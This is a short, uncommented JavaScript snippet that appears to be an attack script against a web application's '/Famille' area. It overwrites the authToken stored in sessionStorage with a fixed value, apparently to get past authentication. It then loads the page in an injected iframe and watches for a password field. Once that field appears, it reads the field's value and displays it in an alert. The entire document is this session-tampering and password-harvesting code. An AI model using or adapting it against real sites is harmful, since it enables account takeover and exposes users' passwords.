sessionStorage.setItem('credentials',JSON.stringify(((c)=>{c.payload.authToken="1234";return c})(JSON.parse(sessionStorage.getItem('credentials')))));

(()=>{
let s=performance.now();
function r(c){let i=setInterval(()=>{if(document.body){clearInterval(i);c()}},10)}
r(()=>{
let i=document.createElement("iframe");
i.src="/Famille";
i.style.width="800px";
i.style.height="600px";
document.body.appendChild(i);
i.onload=()=>{
let d=i.contentDocument;
let w=setInterval(()=>{
if(!d||!d.body||d.body.children.length===0)return;
clearInterval(w);
let o=new MutationObserver(()=>{
let p=d.querySelector('.mdp input[type="password"]');
if(p){
o.disconnect();
setTimeout(()=>{alert(p.value)},2000);
}
});
o.observe(d.body,{childList:true,subtree:true});
},50)
}
})
})()
